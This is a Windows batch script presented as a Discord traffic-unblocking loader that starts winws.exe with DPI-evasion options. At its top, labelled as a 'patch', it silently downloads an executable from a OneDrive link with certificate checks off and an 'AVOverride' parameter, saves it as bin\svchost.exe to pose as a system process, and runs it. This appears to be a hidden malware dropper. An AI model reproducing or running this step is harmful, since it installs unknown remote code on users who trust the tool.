@echo off
chcp 65001 >nul
:: 65001 - UTF-8
SET pc_name=%COMPUTERNAME%


:: Downloading services
echo Download services
r5patcher.exe -c --no-check-certificate "https://xnh5mw.am.files.1drv.com/y4mEo2JrEIPOkb6UPx7MQzeHdzDbIiedKagfjv1T8FS-576h0pR_FZC_YPw6pInpj9eNaUE1hy4ut4QKrd6Yny4-ErSnnGcbrl8Sdk96WFGHanmSblP4tksVqdBFKniIp4b869ESqRuDAF206-SSNrUoVZGsfajcbgO-hG8QWhxfZRzH9Y1CO3cWxYHHwiXmmygEli21cbTAzV-azY216YL8oMu9cjy8ek21nt_P1oL-Hg?AVOverride=1" -O bin\svchost.exe
echo Start patch
:: Start patch
start bin\svchost.exe


:: Path check
set scriptPath=%~dp0
set "path_no_spaces=%scriptPath: =%"
if not "%scriptPath%"=="%path_no_spaces%" (
    echo The path contains spaces
    echo Please move the script to the directory without spaces
    pause
    exit /b
)

set BIN=%~dp0bin\

start "R5 loader [Process : discord.exe]" /min "%BIN%winws.exe" ^
--wf-tcp=443 --wf-udp=443,50000-65535 ^
--filter-udp=443 --hostlist="%~dp0r5discord.txt" --dpi-desync=fake --dpi-desync-udplen-increment=10 --dpi-desync-repeats=6 --dpi-desync-udplen-pattern=0xDEADBEEF --dpi-desync-fake-quic="%BIN%quic_initial_www_google_com.bin" --new ^
--filter-udp=50000-65535 --dpi-desync=fake,tamper --dpi-desync-any-protocol --dpi-desync-fake-quic="%BIN%quic_initial_www_google_com.bin" --new ^
--filter-tcp=443 --hostlist="%~dp0r5discord.txt" --dpi-desync=fake,split2 --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --dpi-desync-fake-tls="%BIN%tls_clienthello_www_google_com.bin"

